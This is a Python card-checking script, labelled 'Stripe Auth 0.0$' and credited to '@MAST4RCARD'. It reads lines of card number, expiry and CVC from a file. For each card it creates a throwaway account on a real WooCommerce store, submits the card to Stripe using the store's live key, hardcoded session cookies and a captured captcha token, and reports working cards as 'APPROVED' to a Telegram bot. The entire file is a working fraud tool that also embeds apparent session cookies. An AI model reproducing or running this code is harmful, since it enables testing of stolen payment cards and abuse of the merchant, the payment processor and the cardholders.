import requests,random,string,bs4,base64
from bs4 import *
import time,uuid,json,re,user_agent
from user_agent import *


O =  '\033[1;31m' #Red.... like< Red Line > only Anime fan will know☆
Z =  '\033[1;37m' #kwhite
F = '\033[1;32m' #Green
B = '\033[2;36m' #Light Blue
X = '\033[1;33m' #Yellow
C = '\033[2;35m' #Purple
print(X+'________________________________________________')
print(Z+'''\nStripe Auth 0.0$ | Dev:@MAST4RCARD''')
print(X+'________________________________________________')
file = input(B+'YOUR FILE CC NAME : ')
#tokbot = input('TOKEN YOUR BOT : ')
#idbot = input('ID : ')
file=open(file,"+r")
start_num = 0
for P in file.readlines():
	start_num += 1
	n = P.split('|')[0]
	mm=P.split('|')[1]
	yy=P.split('|')[2][-2:]
	cvc=P.split('|')[3].replace('\n', '')
	P=P.replace('\n', '')		
	user = user_agent.generate_user_agent()
	r=requests.session()

	
        
	headers = {
	    'authority': 'www.booth-box.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://www.booth-box.com',
	    'pragma': 'no-cache',
	    'referer': 'https://www.booth-box.com/my-account/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}
	
	
	response = r.post('https://www.booth-box.com/my-account/', cookies=r.cookies, headers=headers)
	
	
	reg_match = re.search(r'name="_wpnonce" value="(.*?)"', response.text)
	reg = reg_match.group(1)
#	print(reg)
	
	user = f"user{random.randint(1000,9000)}"
	email = f"{user}@gmail.com"
	#print(email)
	
	cookies = {
	    '__stripe_mid': '32798aa4-db03-42f3-90a1-ba9b84578ba4a6f34a',
	    'mailpoet_subscriber': '%7B%22subscriber_id%22%3A1151%7D',
	    '_http_accept:image/webp': '1',
	    'wp_woocommerce_session_eed13fa1b1dcaf582ce9d9a1888a4bbe': 't_f06b5b76b75b64bd7e07ed6b5e019b%7C%7C1764854490%7C%7C1764850890%7C%7C7cac870816119b12da7967efce595347',
	    'mailpoet_page_view': '%7B%22timestamp%22%3A1764660090%7D',
	    'pys_session_limit': 'true',
	    'pys_start_session': 'true',
	    'pys_first_visit': 'true',
	    'pysTrafficSource': 'direct',
	    'pys_landing_page': 'https://www.booth-box.com/my-account/',
	    'last_pysTrafficSource': 'direct',
	    'last_pys_landing_page': 'https://www.booth-box.com/my-account/',
	    'crisp-client%2Fsession%2F364b614e-0b59-4855-9c73-429812ae66d5': 'session_52deb2ec-bb1f-4e50-8d6c-848c78a82c89',
	    'woodmart_popup_1': 'shown',
	    'pys_advanced_form_data': '{%22first_name%22:%22%22%2C%22last_name%22:%22%22%2C%22email%22:%22fyxbsbsb@gmail.com%22%2C%22phone%22:%22%22}',
	}
	
	headers = {
	    'authority': 'www.booth-box.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://www.booth-box.com',
	    'pragma': 'no-cache',
	    'referer': 'https://www.booth-box.com/my-account/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}
	
	params = {
	    'action': 'register',
	}
	
	data = {
	    'email': email,
	    'email_2': '',
	    'mailpoet[subscribe_on_register_active]': '1',
	    '_wpnonce': reg,
	    '_wp_http_referer': '/my-account/',
	    'register': 'Register',
	}
	
	response = requests.post('https://www.booth-box.com/my-account/', params=params, cookies=cookies, headers=headers, data=data)
	
	
	
	import requests
	
	cookies = {
	    '__stripe_mid': '32798aa4-db03-42f3-90a1-ba9b84578ba4a6f34a',
	    'mailpoet_subscriber': '%7B%22subscriber_id%22%3A1151%7D',
	    '_http_accept:image/webp': '1',
	    'pys_session_limit': 'true',
	    'pys_start_session': 'true',
	    'pys_first_visit': 'true',
	    'pysTrafficSource': 'direct',
	    'pys_landing_page': 'https://www.booth-box.com/my-account/',
	    'last_pysTrafficSource': 'direct',
	    'last_pys_landing_page': 'https://www.booth-box.com/my-account/',
	    'crisp-client%2Fsession%2F364b614e-0b59-4855-9c73-429812ae66d5': 'session_52deb2ec-bb1f-4e50-8d6c-848c78a82c89',
	    'woodmart_popup_1': 'shown',
	    'pys_advanced_form_data': '{%22first_name%22:%22%22%2C%22last_name%22:%22%22%2C%22email%22:%22fyxbsbsb@gmail.com%22%2C%22phone%22:%22%22}',
	    '_lscache_vary': 'df80590aa339d4fd0d24890577d8962f',
	    'wordpress_logged_in_eed13fa1b1dcaf582ce9d9a1888a4bbe': 'fyxbsbsb%7C1765891343%7CQ2teXF6Ahb5t06XkEdVH0T0qaysfQ8QsZa7tG8lEqNz%7Cd2b6117ee6407e13fd414a53a7b7a821573c1685acfa1ad7789bb3a8b2df87ac',
	    'wp_woocommerce_session_eed13fa1b1dcaf582ce9d9a1888a4bbe': '933%7C%7C1764854490%7C%7C1764850890%7C%7C8856e5ef3712dfae04ac038d99f2b35d',
	    '__stripe_sid': '8329748c-de79-48ae-b0f1-637cde8ab425d8bd91',
	    'mailpoet_page_view': '%7B%22timestamp%22%3A1764661028%7D',
	}
	
	headers = {
	    'authority': 'www.booth-box.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'no-cache',
	    'pragma': 'no-cache',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'none',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}
	
	response = requests.get('https://www.booth-box.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
	
	pk_live_match = re.search(r'"key":"(.*?)"', response.text)
	pk_live = pk_live_match.group(1)
	
#	print(pk_live)
	
	non_match = re.search(r'"add_card_nonce":"(.*?)"', response.text)
	non = non_match.group(1)
	#print(non)
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'pragma': 'no-cache',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[name]=+&billing_details[email]=fyxbsbsb%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=beb24868-9013-41ea-9964-7917dbbc35582418cf&muid=32798aa4-db03-42f3-90a1-ba9b84578ba4a6f34a&sid=8329748c-de79-48ae-b0f1-637cde8ab425d8bd91&payment_user_agent=stripe.js%2Fcba9216f35%3B+stripe-js-v3%2Fcba9216f35%3B+split-card-element&referrer=https%3A%2F%2Fwww.booth-box.com&time_on_page=324942&client_attribution_metadata[client_session_id]=64ef186d-afe6-4903-ba0c-bd961a26a9f0&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key={pk_live}&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzY0NjgyNzg2LCJjZGF0YSI6IkNsWEExMjVNWk5FYUx2QlFaV0hidWtsSVhxOWhDcWZ1dy9RNVBmaTVmVEFOb0JkS1B5cEkyWDhtcXJFbkI3VmV6REpjWkxsS25uRGd4SDRLaDU3N3ZtUGNWZXJ4cnpscXBWZGxNUEcvYXkyTUdwN1c5MGpkWTIvdEpCeko5c2NFZHY3UDd5R1VDMzFtaVo4QVBVcG9TTHNVNzIrRGhSeHZkZ2paakJVR0tySjZZZU41S0lHUFFPWTNMTWRsallxOUFoaFBseTNIVC9FaGFZdDYiLCJwYXNza2V5Ijoic001SDBEb25yRG5nVjAwSUV0anJFNGtVVEw1bWlFNSt6aVFXYmZvR3h4MDA1Skx6blNCd3lJUnZObmwwSTMrVUNDVURqdE1rTTFBa1FUcnh0SHJ0RDZSSUd3TG1Delh0b3dRZVlYWnc5SVQ2VTlhSGhXQUZFdGZGQUVyVStjZmNacjFuWnRzMm9aTzdRT0F5cE42MjlwVTBwa2FzeFpCdlFrc1hxcXpYSWFKTmUrVEpwb1lObEdISzJieTBjQldkUW1QSzFUbG9QSHlRaTM1aDh4SHU5SUlFVjhxRmw4bVBkUXo1bXphTDg1Q3QvQTFoaTZnQW5QbEFKT3RMMkcrclZCZG52R1RXVG41RjM5YlpSRitieWxOZ0l2NHNZeFBkRDU5STFTYUhzN3czKzdiazFPOEdPTWpwR1puMlFCUGRNMVRIWDVyUTJCdmJ2bkVERmM1bFlyVGZaa2RLclVBRFhxM2FiZEEwdVNESW1PVWxVVWFoQlR6RFdiNTk1Z09zTG9rczBRTG41eDdRb0s1d1licXcyenNKc05mSEVmK29qOVkyVXBqb0hhUlMyUkJzdTA2ZzArbXdlV2VpNnlCRlpGaTdOTEN6a0psVkwrTTVNM3hMZzJNc0hSeEJjdE9KWlJJR0lTLzhxUlV5VGoxSWdsb3BGaGIxNFhsM3lDVHJWbjhIN0pWRHpiRE9HZUFlTlNadTBiQlNJTXFLTEU5NGUrRjJwaXJkZzFlTjVEU09Ba2hJejNFVWM4aVR3SXlWQ01aOGF3WDNiL1EreGt6NytRM3dpbnRZYmpudFduaTgwdGVrbHFFSDhqeDJDSkE1dFpuSC8vcjIyVzE3YS9jL243b3lHT0hOOU9GL2dub0wyNlNIL21Oemt0V3ZuSm9ldFgxMWNiOXNJMzZOYTFyVncrWVl1MDJNSUEvZlNidUwzMERnL3ZMdkpxeWtNMTdlWjFIa0lnaW9lc3JZV1JNclozcXowQ0xXQlY4UlppWWt6bXpDbHVyUGFaZFFZQS9ISmhpQWxVWlpPNnpkZHJpeldXaDdYOS9LbGVHSFRyMWJUZ09sRjZjejJ6UUVvNkRjWkhNczlqYWx3ODlGNHorcUFpN0hnaXdEWGt2djJxaDRsN2dXMEFISE5Xa2JTZDVvY1U4dlY4K25vV3hvZkIyZVU1TFBhZ1psanc5YVdlNDFZb2lKT0ZXNFFzMjNSS3FuYlpkVXpqQUYvUW9BdEkwLzNDWDRLZVp4V3JDZHdicnhPZk1ueDZLaWo3ZzlSNW1sZXFzd2dKQlRHemZLYmJ6c0dZRnhyUE9Kb2s3STdPZVdEYTlXSGhIQTRBYWRVYUtOZ3BmdVZSQ1dTZlBaa3lDRWFIeWpGWitCZHJEN2VvVlJocFpQdGFpSTU3WHpteUZNOUk5NlpqanRtcWtSRzh3SFNZQ0dSS3BzeE5DUWFwTlppNThESng5ZzU2OE1WbDhyd1NDY3llaTg2cG1IRkM4ZVJ5aGc4a3JwVDhlL2NSV1g5eVZIZ0VGcGVIV2F0bmNnQ3lRZW45MXZ4ZjdsaVhrWlpqTFNrd2o0SGtIL1RtUFArQzdRaHRzRllWeWNJK0txb0s5eEowZFZHbWpPWHdtcFJmMis5emxYbUZueXEvSFczNzEyVDFXWDJMVHdGbDRGWlBuYjZEeXhaZ3djUWE4ZDd6Z2xBSlBxaVVEL1pIcEMyc0NseEpuNkFzRWdSRXM5bWh1UU92UXlOQjlOYXc4WDVjdExKM3FSLzAwNEU3eGFSMlJKUXFlR2NDNnVyaURoaE9NSWJWY2Z1S2RsclRYTTR1NUZ5QVloRmp3aFJmTm95TU1FaEZUcExrcUlSbTVvbHJic0x3MW8vTG9Dd0FnaXMxQ1BReFplMEhwZXNNbzloN0w4OHJlc2JTMWFZL3BoRktJUDRqM3ZnQkt1UXIwWFl4eWY3Yk1hVkl0SXRKbzVtYmZWN1lPU3RFQWt3TEk2VjJId3RXejVKYUs2a3I1Tm9zT2ptaS9hTzNLN08vZHBSRFNDUzF6TVN0aHpkRzFhUU91d2VNV3BRZEYzb3cvQUoxbFVwTUo0ZUlKVWZmWW9md3RKZkxuSTU3Vmc5YTNONW9JcHhZL1hSSE5CS0tjenN0Qm5PRlZuWGhrcWUzd1ZJeFFzMlByQlVJcUVXZmtwUENlOTJDRHpFdkE3clNFY3hSUmsrbkYreU5WSEg1Yk50MWlUUmpBejZKbEtlRENra2xnZDZHeG9PNHJqSkJrNWM5bThobDl4UEgvSGpXVTdJbjBHZTJhaXZjakEwSlZUYStlUGc5dTgyWEIxN3dpOUY5b2RsWURhRkJXczlMM3RiSlhyQm9oMUtsVGZXalUzeG9qMzhSQmdoUHYvVUxMYnhOWGdQWXR4MGhBb0tHVStiTG5NcHRVakZQdFVkbkszNlJDKytpdjdpSG94ZnlRQVIwd2JEcWhDSnMzbVlnaVpaQmJUY2RrS1FjdGpMQWc2Qm5SS0kzSFJZMXhZeUk4WndEd1prajdldlBQYm1ZZWlBalpvWTdMb2VET21IOHgvVDNoK0xSZTlCZkplS0hlNFRwY0ZodjZzL3UwNnNSNXNLMEo4Y1I0PSIsImtyIjoiMzVlNjNkZmIiLCJzaGFyZF9pZCI6MzM5NTEwMzAzfQ.PTC5Jz6uHIfWH2xi9B1bXYVJAr4ESNDW_ITaOqdmY4M'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	id = (response.json()['id'])
	
	
	cookies = {
	    '__stripe_mid': '32798aa4-db03-42f3-90a1-ba9b84578ba4a6f34a',
	    'mailpoet_subscriber': '%7B%22subscriber_id%22%3A1151%7D',
	    '_http_accept:image/webp': '1',
	    'pys_session_limit': 'true',
	    'pys_start_session': 'true',
	    'pys_first_visit': 'true',
	    'pysTrafficSource': 'direct',
	    'pys_landing_page': 'https://www.booth-box.com/my-account/',
	    'last_pysTrafficSource': 'direct',
	    'last_pys_landing_page': 'https://www.booth-box.com/my-account/',
	    'crisp-client%2Fsession%2F364b614e-0b59-4855-9c73-429812ae66d5': 'session_52deb2ec-bb1f-4e50-8d6c-848c78a82c89',
	    'woodmart_popup_1': 'shown',
	    'pys_advanced_form_data': '{%22first_name%22:%22%22%2C%22last_name%22:%22%22%2C%22email%22:%22fyxbsbsb@gmail.com%22%2C%22phone%22:%22%22}',
	    '_lscache_vary': 'df80590aa339d4fd0d24890577d8962f',
	    'wordpress_logged_in_eed13fa1b1dcaf582ce9d9a1888a4bbe': 'fyxbsbsb%7C1765891343%7CQ2teXF6Ahb5t06XkEdVH0T0qaysfQ8QsZa7tG8lEqNz%7Cd2b6117ee6407e13fd414a53a7b7a821573c1685acfa1ad7789bb3a8b2df87ac',
	    'wp_woocommerce_session_eed13fa1b1dcaf582ce9d9a1888a4bbe': '933%7C%7C1764854490%7C%7C1764850890%7C%7C8856e5ef3712dfae04ac038d99f2b35d',
	    '__stripe_sid': '8329748c-de79-48ae-b0f1-637cde8ab425d8bd91',
	    'mailpoet_page_view': '%7B%22timestamp%22%3A1764661028%7D',
	}
	
	headers = {
	    'authority': 'www.booth-box.com',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://www.booth-box.com',
	    'pragma': 'no-cache',
	    'referer': 'https://www.booth-box.com/my-account/add-payment-method/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
	data = {
	    'stripe_source_id': id,
	    'nonce': non,
	}
	
	response = requests.post('https://www.booth-box.com/', params=params, cookies=cookies, headers=headers, data=data)
	msg=response.text
	if 'success' in msg or 'Thank you for your order.' in msg or 'successed' in msg or 'suceded' in msg or 'Your payment has already been processed' in msg or 'Your payment has already been processed' in msg:
		print(F + f'[{start_num}]', P, '|', 'Stripe Auth 0.0$ ✅ ')
		requests.post(f"https://api.telegram.org/bot{tokbot}/sendmessage",
	                      params={
	                          "chat_id": idbot,
	                          "text": f"""APPROVED ✅
	
[♡] 𝗖𝗖 : {P} 
[♕] 𝗚𝗔𝗧𝗘𝗦 : STRİPE AUTH
[♗] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 : APPROVED ⚡
━━━━━━━━━━━━━━━━
[★] 𝗕𝘆 ⇾ 『@MAST4RCARD』"""
	                      })

	else:
		ftx = response.json()['error']['message']
		print(O + f'[{start_num}]', P, '|', ftx)
		time.sleep(5)	
